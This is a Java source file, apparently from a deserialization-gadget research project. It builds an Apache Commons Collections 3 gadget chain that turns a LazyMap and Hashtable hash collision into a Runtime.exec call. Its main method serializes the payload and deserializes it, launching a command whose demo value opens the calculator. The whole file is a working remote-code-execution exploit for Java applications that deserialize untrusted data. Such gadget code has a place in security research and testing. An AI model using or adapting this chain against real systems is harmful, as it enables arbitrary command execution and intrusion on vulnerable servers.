package com.trganda.gadget.cc3;

import com.trganda.gadget.utils.Reflections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Hashtable;

public class LazyMapHashTableExec {

    public static Object getObject() throws Exception {
        ChainedTransformer fakeTransformer =
            new ChainedTransformer(new Transformer[] {new ConstantTransformer("1")});
        ChainedTransformer chainedTransformer =
            new ChainedTransformer(
                new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}),
                    new InvokerTransformer(
                        "exec",
                        new Class[] {String.class},
                        new Object[] {"open -a calculator"})
                });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap<>(), fakeTransformer);
        lazyMap.put("yy", 1);

        // 于 lazyMap 的 hash 值计算结果相同
        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(new HashMap<>(), fakeTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable<>();
        hashtable.put(lazyMap, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(lazyMap2, "factory", chainedTransformer);
        // 恢复 lazyMap2 的 hash 值计算结果
        lazyMap2.remove("yy");

        return hashtable;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
                new ObjectOutputStream(
                        Files.newOutputStream(Paths.get("target/LazyMapHashTableExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
                new ObjectInputStream(
                        Files.newInputStream(Paths.get("target/LazyMapHashTableExec.bin")));
        ois.readObject();
    }
}
